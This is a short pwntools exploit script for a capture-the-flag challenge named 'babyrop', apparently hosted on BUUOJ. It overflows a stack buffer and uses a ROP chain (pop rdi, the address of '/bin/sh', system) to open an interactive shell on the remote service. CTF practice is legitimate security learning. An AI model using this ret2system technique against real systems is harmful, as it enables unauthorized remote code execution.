from pwn import *

context.os = 'linux'
context.arch = 'amd64'
# context.log_level = 'debug'

systemAddr = 0x400490
binshStr   = 0x601048
popRdiAddr = 0x400683

if args.LOCAL:
    p = process("./babyrop")
else:
    p = remote("node3.buuoj.cn", 25647)

payload = b'a'*(0x10+8)+p64(popRdiAddr)+p64(binshStr)+p64(systemAddr)

p.sendlineafter('name? ', payload)
p.interactive()